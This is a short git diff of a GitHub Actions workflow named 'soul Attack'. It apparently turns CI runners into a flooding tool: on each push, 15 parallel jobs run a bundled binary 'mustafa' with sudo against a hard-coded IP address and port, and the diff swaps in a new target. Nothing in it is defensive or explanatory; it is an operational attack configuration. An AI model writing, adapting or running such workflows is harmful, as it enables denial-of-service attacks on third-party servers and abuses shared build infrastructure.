@@ -2,14 +2,13 @@ name: soul Attack
 on: [push]
 
 jobs:
-  network-test:
-    runs-on: ubuntu-latest
+  soul:
+    runs-on: ubuntu-22.04
     strategy:
       matrix:
-        worker: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
+        n: [1,2,3,4,5,6,7,8,9,10,
+            11,12,13,14,15]
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v3
-    - name: Make binary executable  
-      run: chmod +x mustafa
-    - run: sudo ./mustafa 20.235.51.68 12396 60 51 999
+    - uses: actions/checkout@v3
+    - run: chmod +x *
+    - run: sudo ./mustafa 20.204.148.51 14431 60 51 999
